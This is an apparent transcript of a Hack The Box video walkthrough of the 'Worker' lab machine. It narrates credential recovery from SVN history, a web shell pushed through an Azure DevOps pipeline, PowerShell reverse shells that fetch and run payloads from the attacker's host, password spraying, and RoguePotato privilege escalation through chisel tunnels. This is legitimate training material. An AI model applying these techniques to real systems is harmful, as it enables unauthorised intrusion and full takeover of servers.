 what's going on youtube this is ipsec i'm jordan werker from hack the box which has two ports open there's a web server that does virtual host and apache subversion if you poke at the subversion you'll notice it's just like it and you can find a password in the revision history this password gives you access to one of the websites that is the azure devops portal which is just like github or gitlab and there's a pipeline that takes the master branch and copies it down to a website so if you upload a reverse shell to the master branch you can show the box as the iis user this is server 2019 so juicy potato doesn't work but you can do rogue potato to get a show on the box with one twist which we'll cover at the end because that's the unintended round the intended way is to dump all the other users subversion passwords gain access to the azure devops portal as the builder account and this account can actually create pipelines which can get you system on the box it's different than before because now you're actually injecting code into the process that copies the master branch down to the website and not the process that just hosts the website so with that being said let's jump in as always i'm going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it worker and then the ip address which is 10 10 10 203 this can take some time to run so i've already ran it looking at the ports we have just two ports open the very first one being http on port 80 and it's telling us it's a microsoft iis web server and then we also have svn serv subversion which is kind of like an old version of get by apache it's a subversioning system on port 3690 now the weird thing is we see this being a windows box but we don't have 445 open um the other like remote access port for windows i think it's 59 85 and 59.86 which is win rm but that's not in the top 1000 ports for nmap so it doesn't show that by default so i'm going to run a full port scan on this box just so we can know if when our m is up i know i could probably specify 59.85 but i'm not 100 positive that support so this will definitely get it so i did all ports the ip uh dash v is gonna be showing me open ports as it finds them oh a again output all formats worker dash all ports and that should be it i don't do the script scan because script scans with all ports is going to take forever but yeah so while that goes let's just go check check this out so 10 10 10 203 and we just get a blank iis page so from here we could run a go buster or we can just go check out the um svn rebel so i'm going to do svn help and this is going to give you all the commands you can do in svn and the important one probably is going to be ls which maybe it's under list and it's alias yeah ls and list so we can do svn ls svn colon colon 10 10 10 203 and this is going to list the items in this so we can do svn log which is like looking at the commit history and that's gonna show five different revisions which are commits so all by this nathan user n-a-t-h-e-n i think that's a different way to spell nathan than i normally do but uh svn checkout and we can just specify the url and we can download it and right off the bat we get a dimension.worker.htb so i'm going to add that to my host file so etsy host and we can do i need to do that in sudo sudo etsy host and 10 10 10 203 add dimension dot worker.htb i'm going to look at move.txt and it gives us a another place devops.worker.htb so we can add this as well and let's try going to those pages so i'm gonna go to uh devops.worker.htb and we get authentication required it's requesting our username and password we can try like admin admin admin guest and we don't really get in um we can potentially run hydra and brute force and a bunch of credentials but i don't know the password policy on this box yet and i always hate running credential brute forces without knowing the password policy because you may just lock random accounts out so let's move on and do the other one which was dimension.worker.htb so let's copy this go here and yes take me to that link and we get a page going over to intro uh it looks like um nothing too much check out some of our awesome work and we get some pages so alpha cartoon lens solid state these are all various sub domains so let's add them all um i'm just going to do a curl request on this i would do dash s and dash q to make it quiet if i don't do that it probably will like have a downloading page or something and i'm going to grep for let's do dot dotstar.worker.htb and we can say dash o to only grab what we grepped and we can add let's see http colon slash and there we go now we have a list of the domains i'm going to just run a quick set to make this easier to copy and paste so said http colon slash slash to nothing and let's go and create a new pane etsy host and let's add all these domains so we have alpha then cartoon lens i should have done a different set to like put these all on one line but almost done now spectral and story so now that we have our host file populated we can go and burp suite and grab them all out so let's just hit up twice so we get the full urls to make it easier for us to copy this time and go into rip suite we can check each page out and determine if we want to look into it more so looking at alpha i see a lot of like lorem ipsum stuff and we have a sign up thing if i do a test email i'm not sure it actually sent anything if i click sign up it goes nowhere learn more goes nowhere so a bunch of blank stuff on that site i'm going to ignore it for now and we can go move on to the next one and looking at this looks like it is definitely a page i'm clicking around to see if there were any links to this if i saw each of these went to a different blog post i may try like sql injection around this place but um it looks like everything's just going to dead links again nothing too interesting here just looks like a blank page let's check out what lens is so let's go over the lens and again nothing too special going over to solid state uh hit this we have a menu here uh generic oh it has a login so let's try going over to login and going there leads us nowhere we can try to go to sign up and this goes nowhere as well so let's go over to spectral and this is probably going to be the same thing all these pages doesn't really have too much dynamic content so it doesn't really want looking into it further if we run into a dead end elsewhere then we'd probably go back and revisit all these pages maybe do dirt busting on this since we have a lot of random host names it may be worth it to do a go buster against a hostname list so we could do go buster put it in let's see h it's been a while since i did this uh v host is what we want to brute force virtual host and let's go to let's see help insecure let's just go up sec list probably a capital s then let's do discovery dns sub domains top one million five thousand and we can do dash w and pi dash u 10 10 10 202 i think it is and let's see that's not it cat etsy hurts 10 10 10 203 off by one so now we have this to just brute force a bunch of host names but let's go back over to our subversion command and i'm going to make the directory sub svn and we're going to do svn check out svn colon slash 10 10 10 203 the reason why i'm doing this is just to try to stay a bit more organized because svn does create like this hidden directory dot svn so let's do rf and it looks like everything that is an ip address is giving us a 4 400 error let's see so nothing too interesting all those were 400s so going into our sub sbn directory we can do the svn and then help we wanted to let's see check out something a different revision so we don't want to do check out merge maker status probably update or up so svn up help update what um i think up svn up dash r for revision so if we did svn log we can do svn up dashr2 and now we have a new file it updated or it deleted move.text and created deploy.ps1 if we look at deploy.ps1 we have credentials nathan and window98 so i'm going to do vi dot slash creds nathan and then wendell 98 just so we stay organized and i'm going to check out each one of these so let's go to revision3 we updated deploy.ps1 let's see note we can't have my password here so he removed his password let's do version three we deleted deploy.ps1 uh yeah deploy.ps1 and revision5 they added move.txt back so we do have credentials so let's go over to was it devops dot workday.htb i think that was the one that asked us for credentials and we could say nathan and then worker 98 uh nathan it wasn't working 98 it was wendell 98 and it looks like we do get in let's go back to our end map when we did all ports and we do have 5985 open so i'm also going to run evil when rm h just so i get all the flags uh we want dash i 10 10 10 203 dash u is gonna be nathan and dash p is password this is going to be wendell 98 and see if we can get a winram shell we'll just let that one sit and go poke at this so this is a azure devops and if we go to smart hotel looks like we are in um some type of repository and azure devops looks like it's kind of like a get lab github or google gears or something we can look at pipelines and this is what happens to various repositories after they get compiled so we can see each of the host names like spectra solid state lens cartoon these all sound familiar if we go over to the view of the pipelines once it loads we can see agent job 1 and deploy website so upon the like uh pipeline being executed which probably happens when something gets moved into master which is just a git repository it's going to deploy the website to w colon backslash sites backslash the repository name dot worker.heb now this is interesting it's on the drive w so we may want to keep in mind that and we can click around here to see if they had any like other credentials in this but it doesn't look like it so i'm going to go over to the repositories and we're going to try to update something so we're in the repositories it looks like we're in spectral so i'm going to clone this so i'm going to copy this and let's make the directory code and then get clone uh try my other clipboard whenever i save my other clipboard i'd hold ctrl shift and then insert nathan i misspelled that nathan and wendell 98 was the password and it looks like we are downloading it so we have to decide what type of web shell we want to try putting in here i'm going to go with an aspx just because it's windows and windows should be able to execute that if i saw this was running in the apache web server or engine x i'd probably change it up do like php or something but since it's windows i'm going to go with the good old asp so going in my opt directory i want to go to web shell and this is i believe 10 c t e n n s uh c let's see get config uh yeah 10c so here's the url of the git repo i'm using if you just go here a bunch and bunch of good web shells so i'm going to do find dot dash name star dot aspx and we pick one we want um let's see cmd.aspx this fuzz db web shell is the one i like using so we can do fuzz db and if this doesn't work then i do the cmd asp.aspx next so cp this into what is it uh home or hdb worker i'm gonna go into this directory we're also gonna make the directory dub dub dub just to stay organized put it in here and now let's um actually i was imagining me executing this uh we're not executing it we want to uh put this in our repo so code spectral and now i can do a get add and then git commit dash m and we're gonna say this is definitely not a malicious request and then we can do git push uh username nathan wendell 98 and it is rejected pushes to this branch are not permitted um okay so let's do get branch ipsec and we can do git checkout ipsec so what we're doing here is just creating a new branch that is not master so now let's get push we have to set the upstream so paste this nathan and then wendell 98. so now we have a new branch if we go over to this code and click here we do see the branch here so see i thought it would have said something up here saying to create a pull request oh right here you just updated ipsec do you want to create a pull request i do so the pull request is going to merge a repository into master so the work items you do need to put something i'm just going to put one and then select the very first thing i chose one because it's generally an id so you can just put any id you want uh we have two now but create it and the pull request should be created and we'll see if we're on the approvers to approve the pull request looks like we are so now it is approved and now let's complete it and this is going to push our code into master and now that our code is into master we can see if this pipeline goes off if the pipeline does trigger then we should be able to hit our web shell so let's go to spectral.worker.htb cmd.aspx resource cannot be found let's see spectral that is the name so i'm going to just give it a few minutes to see if it actually goes through um i'm going to do a watch command so that's going to run every one second and i'm just looking around here to see if there's anything i can click to say execute this pipeline and i may if this doesn't work may just try a different repository if we go over to pipelines i'm not sure what one we looked at earlier uh this is looking different we still have that not found let's see releases builds oh because we're in smart hotel but we can look at view and based upon view we do have deploy website and it should have deployed to this worker.htb and we can see right here it's removing.get so it doesn't push that repel but oh there we go it's here but not on my curl uh what curl i want to type out something oh um i did not type curl so now it's running every second uh live and learn but now we got this web show up we can run net user to verify it works and holy cow there's a lot of users on this box uh first thing i always like doing is getting a reverse shell so i'm going to now go into what is it it's in my op directory i believe um i don't see it it's probably user share so cd user share machine that's what i want uh shells and i wanna grab um invoke powershell tcp i'm gonna do line dot ps1 and let's cap this or v this actually not cat so we can edit it and i want to take this one liner and i'm going to put my ip address here so 10 10 14 4 port 9001 so now we have a powershell one liner and now we got to convert it to be a windows base64 format so you do icon t for two and then utf-16le to convert it to utf-16 little ndn format and then base64-w0 and we can copy this code and then i'm going to run maker log i'm going to do script shell i will do script one i guess actually one dot log and then rl wrap netcat lvnp 9001 that script command's just going to log everything i run so we can do powershell dash enc paste this and we get a connection if i do ls we have all the directories so we can run this net user command see all these users we could do like net local group administrators we see there's one administrator user we could probably do net local group with nothing and see all the groups uh i don't know what this vsts agent service is uh there is it dev i'm going to look at what's who's in this dev group or net local group nathan or net user nathan we are in production so net local group uh dev and a lot of people in this dev group so instead of poking around all this if we go back a while there was this uh w directory and the pipeline so let's go take a look at what is nw so we do dier we do have agents azure devops sites and the subversion repos now subversion puts all the credentials in a file and if we're lucky they won't be encrypted and if they are encrypted then we can try to decrypt them so let's try to type the passwd and it looks like we have just a list of a bunch of credentials so we can copy this and see if we can log in with these accounts so control z okay there we go i'm in the nmap window so this is no longer nmap v i'm just going to do work and i'm going to put this in the format i want actually let's put this in creds and then put it in the format i want which is going to be uh percent s space equal space and i put a colon there uh what there we go so now we have that uh the very first one is um nathan and wendell 98 so it looks like these could be good creds so i'm going to save this and i'm going to split these up into user names and passwords so i'm gonna do awk dash capital f colon print one and then creds uh print dollar one and we can put this to users and then pw for passwords we can't pw we have that so now we can do crack map exec and we're going to use the new brute force option so winrm 10 10 10 203 dash u users dash p pw i think it's no brute force that how you do it it's gonna tell me unrecognized command it is so maybe brute force is like that and what this is supposed to be doing if i'm doing the command line correctly is it's only going to do one password per user so if we did head dash 1 users and pw it's going to use this credential set and if we do dash 2 it's going to use nitchin and then this password so it's just going to map users and passwords up one to one and try those credentials but something is going on here i may have to update crack map exec or something because we're not even getting anything um we should get a success right away because we know the nathan user is a valid password uh ping 10 10 10 203 looks good let's see crack map exec it won't spell it out sometimes they're linked to different versions on my box um i'm horrible with python reapers and it's still not working after a while we have this nasty python error so one of my dependencies is screwed up when rm has no obj attribute server os so what i'm going to do cd opt and crack map exec we'll get pull to update it and let's see install crack map exec and let's see does this have guides it does uh i'm going to delete it and do this recursive because i'm not positive if i did recursive in this option uh sudo and then we can do git clone recursive yup and then the next thing we'll do is go in and run poetry install and poetry is kind of like um pip i guess it's just different package manager so poetry let's do pip 3 install poetry do i have it is this how you install poetry it looks like it is using one package manager to install another package manager i love it with poetry installed now we should be able to install crack map exec and this may take a while i'm not sure exactly how long it will take so we're just going to fast forward the video and let it install it is now done didn't take too long so now we can do poetry run i think crack map exec i spelled it wrong uh let's see let's copy this and hope it works uh poetry run there we go so now we can do winram 10 10 10 203 and then we'll do home my name is ipsec then hdb worker users and we need specified dash u and dash b home ipsec worker pw uh hdb pw or hdb worker pw tab auto complete saves so many errors uh no brute force and see if this runs looks like i'm gonna be out of luck with running crack map exec come on after a while it actually started running so i'm not sure exactly what it was doing maybe it's trying to do some type of reverse dns and that's probably what it's trying to do because crack map exec does get the hostname of the box uh it doesn't look like it's showing it but it probably got the host name of the box and then try to do a reverse look up so we do have credentials here however this taking a while is bugging me so let's see if we can figure this out real quick so sudo wireshark and let's see what it does um dns and then we can run this and it doesn't look like it's doing anything by google.com i do see dns request so maybe it's not dns it's possible the remote end is doing something um i'm not sure why that was taking a while but let's go with this cadential set so uh evil when rm dash i 10 10 10 203 dash u robbie sl dash p wolves 11. you can see it's still thinking i'm going to try leaving that go so you can see exactly how long it takes without me pausing the video or anything but we can do uh net user rob esl to see more information about me or this user and let's see i am in production and management user you can see now crack map exec is running robin is slip so don't really see anything too interesting other than being in remote management users we could also run like who am i slash all to see everything we have we can see your privileges and seeing this reminds me of something uh let's go back to our webshell and run who am i slash all we can see that we do have the sc impersonate uh privilege if i run system info it's going to tell me this version of windows we can see what hotfixes are installed so you can look up these kbs and get an idea when this box was last patched but the main thing i want to see is what version of windows and it's 2019 standard so juicy potato won't work but rogue potato will and we'll do at the very end of the box because i don't think i've shown rogue potato in its fullest yet so that would be the unintended prevest we do but going through all this nothing really makes sense too much uh the one thing we didn't do is we didn't continue on success on this so if i look at my passwords or let's cat users robbie is nowhere near the last user there's quite a few users after him but crack map exec by default is only going to stop on when the very first thing is successful so if we do dash dash continue on success it's going to take a while to run crack map exec but this time it will keep running after it prone something to see if we get a another user but while that goes i'm going to copy this and let's see if robbie can see anything different in this application and i probably would run things like win peas and other tools but in the sake of simplicity and time i'm not going to show every step on every video i do but uh if we look at this type of something robbie sl and wolves 11 so robbie sl i know robbie can log in oh robbie isl so copy robbie is yeah that's what i was putting uh let's try this again robi sl paste i have no idea what was happening there um hopefully looking at the vod can show a type i was making every time but instead of hotel 360 or whatever it was we have this pertz unlimited thing so we have something slightly different here and if we go to this pipeline let's see what we have we have no pipelines found but it is letting us build a pipeline so let's click on build and then it gives us a few options um i'm going to do this use classic area to create a pipeline without yemo because it sounds simpler so we click this build and then let's see this looks fine and azure repo get um if we scroll all the way down it lets us build with an empty pipeline so let's just do empty um agent pool i'm gonna click on manage to see what this is we can try putting like one like we did before and it's not auto populating with us if we look at this we have one agent pool which is set up so i'm to do setup looks like it configures and then sources agent job and if we click the plus it's letting us do things so i'm going to search for powershell and we can run powershell so let's add that and it needs some settings so let's see script path um and then arguments so let's see script path test or we can just do uh c colon backslash and then arguments uh let's do users public uh documents runme.ps1 and then we can go here cd users document up cd users public documents cd public uh permission denied uh let's see dir i'm hoping to find like a word readable directory um windows let's do temp maybe this will work and then we can do wget 10 10 14 4 port 8 000 and let's see any other users this is the crack map exec after robbie and we don't have anyone so cd hdb and then the other thing is the box name dub dub dub and i want to copy that reverse shell we had ran so cp user share nashang invoke or this is going to be shells and then invoke powershell tcp oneline oneline.ps1 i wonder where i had copied that to oh well we can just redo it not a big deal so we can now do 10 10 14 4 and then port 9001 and i'm going to name this to something more easy so shell.ps1 and yeah so python3 dash m http server shell.ps1 dash ps1 it has successfully downloaded it so this is going to be c colon backslash windows temp shell.ps1 nclvnp 9001 error action let's continue on error save and queue agent pool setup and if this runs build 172 has been queued we can look at the status it's connecting and we'll see if we get a reverse shell so it's doing check out and after the checkout we run this powershell script and the reason why this robbie user can run and the other user can't because robbie is an administrator of this repel so formatted command did run looks like it did we do who am i we are nt authority slash system so if we go to cd slash or actually see colon cd users administrator dir and then desktop and then type root.txt we can see that is indeed the flag so hope you guys enjoyed the video and actually i'm not done uh i forgot i promised i would be doing the rogue potato because if we do here my slash all we can see we have this sc impersonate privilege so yeah to start off we should download rogue potato so i'm just going to google rogue potato privesque and if we go to the very first result we can download it if we go to releases and download rug potato.zip and you probably should read all of this because it is a good blog post we won't be explaining everything but we will do a very very brief explanation so if we go to dub dub dub and we can move what we downloaded so rogue potato and then we can unzip it if we look it gave us two files the executable and the oxide resolver um i don't think we're gonna need the oxide resolver we're just gonna use the standalone version so we can exit out that and let's go to the c drive and go to windows temp and do wget 1010 14 4 port 8000 roguepotato.exe and we'll just call it rp.exe so now that we have it downloaded we can try executing it and we can see the information um this is where it's going to differ from juicy potato because it does some weird spoofing for rpc so this explanation is probably going to be wrong but it's kind of how i understood it and juicy potato um you can make it call back to anything or any rpc port so you run juicy potato and it says hey connect back to me on rpc 127 uh 99999 and then the server connects and that's where you steal the token because you control this port uh rogue potato what microsoft had done that kind of fixed it was prevented the spoofing so when you do this um you can no longer to have it go to any port so they hard hard-coded this port to be 135. so what rogue potato does is it says instead of changing the port go to um attacker's machine on port 135 which then is going to direct you back to the uh target which is uh 127.001 whatever host you're exploiting um 135 or 99999 to steal token so all it did was instead of spoofing the port it spoofs the ip address and then yeah you can complete the request that way uh what's listening on 9999 this is going to be the uh rogue oxide resolver so juicy potatoes going to start this one up for us if we were running this from a windows box we may not have to direct it all the way back to itself we can just run the octa resolver here but we're going to ignore that and the main issue we have right now is um the firewall so we can't direct it back at target 9999 because the only ports open on this box are going to be the three that nmap said uh 80 the subversion port and the windows remoting port so there's the only ports that are open but we can use chisel to bend the port and open up additional ports so we're gonna have to put chisel on this box next i'm going to clear this out just so we have a clean slate and i'm gonna see if i have chisel uh if we do locate chisel.exe i do i'm just going to copy chisel and if you don't know what chisel is you can search ipsec.rock so just do chisel github and download it um actually i'm going to download it because it may be different versions since 14 days ago i don't want to run like a different um version client than server or whatever so let's download it a chisel let's see amd 64 we want and we probably want the windows amd 64 as well so i'm going to do htb box uh not boxes just hdb worker dub dub dub move downloads chisel we'll do the linux one gun zip dash d chisel uh ch mod plus x okay we can execute it so now we need the executable uh how'd it save oh come on uh open there we go so that should have let me save it it's funny the windows one is classified as a virus but the linux one is not so let's do downloads and it's gonna be did not save let's just let's see how do i extract this extract and we'll say where's htb then we want to do worker and then dub dub dub extract there we go and we have chisel.exe awesome let's stand up the web server and we'll do wget http 1010 14 4 port 8000 chisel exe chisel exe and i just realized we may have to get another reverse shell which is going to be painful uh it is a pretty big file so it will take a little while to download and now we can run her chisel server so cdw and i'm going to say server mode port 8000 allow reverse and we don't need the web server anymore because we've copied all the files to it so we have that now we can run chisel.exe client 10 10 14 4 port 8000 let's listen on quad 9 on localhost quad9 so we have the session up and running so on my box now we have port 9999 listening so uh parrot 999 is mapped to worker 9999 so we have to get a another shell to the box so rlrap nc lvmp 9001 and is our command still up it is not i should have okay sweet i can copy this base 64. so what we have to do is another request so let's sign out and then i'm going to go back here uh what maybe a cache is caching issue um okay i'm logged in as uh natalie or nathan or whatever so that is fine i don't know why i'm logged in but i am let's go to uh we can sound to that code spectral get push nathan wendell 98. now let's see go to files oh we have to change the repel to spectral i'm not sure why it put me on spectra to begin with earlier in the video let's click pull request item id 1 create then we have to approve complete complete merge then i want to copy this box see if it exists yet it does not exist if we go again there we go paste this and now we got a shell so cd windows temp and we can say rp.exe and now we should be able to get this so we already have shell.ps1 maybe i just can't read it uh i wonder who he creates joe.ps1 as i think the robbie user so nclvmp actually we'll do it down here so now we can run rogue potato so dash r this is going to be 10 10 14 4 dash e and we're going to say seagull and windows temp shell.ps1 we'll see if this works oh we didn't set the socat up so we have to set this up and we'll do that here and the two things we have to do uh sudo to listen on 135 and then we can't hit um worker 9999 directly we have to go through a chisel tunnel which is 127.001 i was trying to get that on one line so now when we run this and see if anything happens so we ran juicy potato her rogue potato ensure it is run on your local machine what if i specify l quad 9 because we want this to be ran locally there we go i think um kind of [Laughter] well maybe we can specify powershell there we go we do who am i we're anti-authority system so that let us run a rogue potato or private and again what that happened was see if we have this workflow so we sorry for the sloppy cut i was trying to explain this in the vim terminal and it did not work out so switching to ms paint and we're going to try it so 10 10 14 4 is this and i'm just going to call this one parrot and then dash e where's our command this is going to be a rev shell command and dash l it's we put 9999 this is the oxid resolver but since this one is the new thing that's we're not putting in like variable syntax so let's do that and then we can say worker and then attacker okay so let's create a line and kind of draw a workflow so with juicy potato we run potato i'll put this in a different color let's go dark green run potato and this um make system connect to 127.001 99999 steal token run command so this is essentially juicy potato and what microsoft did was prevented us from editing this port so it's only on 135 now so instead of um spoofing the port to 9999 it spoofs the ip address to whatever we want so we're putting this one to parent which is 10 10 14 4. now on our attacker box we have nothing listening on port 135 that's why the instructions told us to run socat so if we do socat here let's say do i can i copy my command yeah that's me trying to explain it let's go back here and copy the socat command so what the instructions wanted us to do i have to go back to ms paint over here there we go is we have circuit tcp listen and it wanted us to do 10 10 10 we'll just say worker now we couldn't do this because of firewalls because our machine on 135 cannot connect to worker on 9999 so what we did was we ran chisel so chisel forward worker 99999 to localhost 9999 so now we edited this to be localhost 9999 and this works because roguepotato when we run it let's delete that and get text so execute rogue potato stand up oxid on local 9999 and wait for connections and profit steal token to profit so send rpc to 10 10 14 4 135 okay that looks good so we sent it to ourself on this 135 and it forwards to localhost which is chiseled back to here to this oxide resolver so it's a convoluted setup and let's see we execute rogue potato and it sends rpc to here and then this one gets mapped up here maybe i should do this in red so the very first request we go there then this gets mapped here and this let's see goes here which then goes here come on paint so one two three [Music] and we'll put that up here four and then i can do its normal path down which will be five so that's the path um there isn't a ton an alternative way where if we could run the rogue oxide resolver executable on our box then we wouldn't have to do this chain so we could get rid of this step and we could get rid of this and this could just be wasn't not typing rogueoxid resolver.exe and this then can be gone and you could go all the way down to this way but i didn't opt for this route because we'd have to run an executable on our linux box so we would have swap over to like commando and do all that stuff so this was easier in my mind even though it's a complicated network map i mean it's a straightforward pivot so again the rpc goes to urbox on 135 and we have 135 bent to go to localhost 9999 which then maps back to worker um what we probably could have done would be just have chisel map 135 to uh worker 9999 and get it working but it was easier to picture this way what i mean by that was if we change this if we don't run socat at all and got rid of socat and we say ford worker 99999 to localhost um 135. then we kind of simplify this whole attack a lot but yeah let's try that so uh let's do it live and try this um let's see the issue is i don't want to control c anything so i'm going to do task kill im chisel.exe if i go over here i still have chisel running see task list chisel i have it running so task kill slash im chisel.exe f for force there we go sweet now we want to get a reverse shell again so we're going to kill this um socat and i'm going to run chisel here and we're going to run the same chisel command and chisel connect here and let's see 135 right i think it's 135 it's at 135 or 134. uh 135. so we're going to list run this with sudo okay and i had to run at sudo because we're no longer telling chisel to eventually listen on 9999 we're mapping it to 135. so if i run this command now we have a proxy localhost 135 is now listening and if i go up here and run this let's see what happens so run this and something went wrong because that should be connected and then forwarded back see chisel exe client 10 10 14 4 8 000 connected let's see nczv localhost 135. it is connected i wonder if this is still listening on quad 9. let's see netstat a n a n find string quad 9 it's not oh um now this powershell here there we go i was using an old command there we go so that works so again if we go back to our beautiful paint um send our pc to that and that is mapped to chisel forwarded to working 999. um yeah hope this all made sense if it didn't um i guess better luck next time i do road potato take care guys and i will see you all next week